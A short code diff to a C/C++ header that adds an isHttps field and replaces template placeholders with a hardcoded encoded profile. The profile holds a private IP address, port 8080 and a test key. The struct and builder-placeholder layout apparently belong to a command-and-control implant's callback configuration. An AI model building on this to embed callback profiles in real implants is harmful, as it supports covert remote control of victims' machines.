@@ -5,6 +5,7 @@
 struct DomainEntrys {
 	PCHAR domain;
 	UINT  port;
+	UINT isHttps;
 	BYTE  UseSSL;
 };
 
@@ -31,16 +32,15 @@ struct Config {
 };
 
 
+inline PBYTE GetProfile() {
+	return (PBYTE)"\x01\x00\x00\x00\x0c\x00\x00\x00\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x32\x34\x00\x00\x00\x00\x90\x1f\x00\x00\x01\x00\x00\x00\x08\x00\x00\x00\x54\x45\x53\x54\x31\x32\x33\x34";
+}
 
-//PCHAR GetProfile() {
-//	return <*PROFILE_DATA_REPLACE*>
-//}
 
-//
-//UINT ProfileSize() {
-//	return <*PROFILE_SIZE_REPLACE*>
-//}
-
+inline UINT GetProfileSize() {
+	return 44;
+}
 
 
 BOOL LoadConfig();
+extern Config* conf;
